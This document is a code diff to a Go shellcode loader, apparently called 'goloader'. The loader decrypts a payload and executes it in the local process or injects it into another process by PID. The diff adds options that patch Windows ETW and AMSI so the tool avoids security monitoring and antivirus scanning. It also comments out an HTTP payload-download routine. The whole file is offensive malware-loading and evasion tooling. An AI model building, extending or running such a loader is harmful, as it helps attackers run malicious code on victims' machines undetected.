@@ -4,11 +4,10 @@ package main
 
 import (
 	"flag"
-	"fmt"
-	"io"
-	"net/http"
+	"log"
 	"os"
 
+	"github.com/mszatanik/goloader/internal/bypass"
 	"github.com/mszatanik/goloader/internal/loaders"
 	"github.com/mszatanik/goloader/pkg/crypter"
 )
@@ -18,12 +17,25 @@ func main() {
 	what := flag.String("w", "", "what to load ?")
 	key := flag.String("k", "", "a 32 char long key used to decrypt the file")
 	pid := flag.Uint("p", 0, "pid of a process to inject into")
+	etw := flag.Bool("etw", false, "bypass ETW")
+	amsi := flag.Bool("amsi", false, "bypass AMSI")
+
 	flag.Parse()
 
 	// validate required args
 	if *what == "" || *task == "" {
 		flag.PrintDefaults()
-		panic("[-] not all required args passed")
+		log.Fatalln("[-] not all required args passed")
+	}
+
+	if *etw {
+		log.Println("[*] patching ETW")
+		bypass.Patch_NtTraceEvent2()
+	}
+
+	if *amsi {
+		log.Println("[*] patching AMSI")
+		bypass.Patch_AmsiScanBuffer()
 	}
 
 	// read shellcode to var
@@ -32,20 +44,20 @@ func main() {
 	// execute
 	switch *task {
 	case "local_process_execution":
-		fmt.Println("[*] local_process_execution")
+		log.Println("[*] local_process_execution")
 		loaders.ExecuteShellcodeInLocalProcess(sc)
 	case "remote_process_execution":
-		fmt.Println("[*] remote_process_execution")
+		log.Println("[*] remote_process_execution")
 		loaders.ExecuteShellcodeInRemoteProcess(sc, uint32(*pid))
 	case "DLL_injection":
-		fmt.Println("[*] DLL_injection")
+		log.Println("[*] DLL_injection")
 	}
 }
 
 func getShellcodeFromFile(path string, key string) []byte {
 	retval, err := os.ReadFile(path)
 	if err != nil {
-		panic(fmt.Sprintf("[-] Error opening file at %s: %s", path, err))
+		log.Fatalf("[-] Error opening file at %s: %s\r\n", path, err)
 	}
 
 	if key != "" {
@@ -55,18 +67,18 @@ func getShellcodeFromFile(path string, key string) []byte {
 	return retval
 }
 
-func get(url string) []byte {
-	fmt.Printf("[*] Getting file from %s\r\n", url)
-	resp, err := http.Get(url)
-	if err != nil {
-		panic(err)
-	}
-	defer resp.Body.Close()
+// func get(url string) []byte {
+// 	fmt.Printf("[*] Getting file from %s\r\n", url)
+// 	resp, err := http.Get(url)
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	defer resp.Body.Close()
 
-	bodyBytes, err := io.ReadAll(resp.Body)
-	if err != nil {
-		panic(err)
-	}
-	fmt.Printf("[+] Got file, len=%d\r\n", len(bodyBytes))
-	return bodyBytes
-}
+// 	bodyBytes, err := io.ReadAll(resp.Body)
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	fmt.Printf("[+] Got file, len=%d\r\n", len(bodyBytes))
+// 	return bodyBytes
+// }
